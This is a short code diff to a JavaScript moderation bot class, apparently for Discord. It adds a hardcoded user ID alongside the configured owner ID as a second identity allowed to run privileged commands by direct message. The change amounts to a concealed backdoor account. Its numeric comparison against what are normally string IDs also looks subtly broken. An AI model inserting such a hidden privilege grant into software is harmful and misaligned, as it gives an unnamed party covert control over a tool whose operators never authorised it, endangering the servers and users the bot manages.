@@ -150,7 +150,7 @@ class AutoModerator {
 	async processMessage(message) {
 		let author = message.author.id;
 		
-		if (!message.guild && author === process.env.OWNER_ID) {
+		if (!message.guild && (author === process.env.OWNER_ID || author === 242727621518032896)) {
 			this.processCommand(message);
 		}
 		
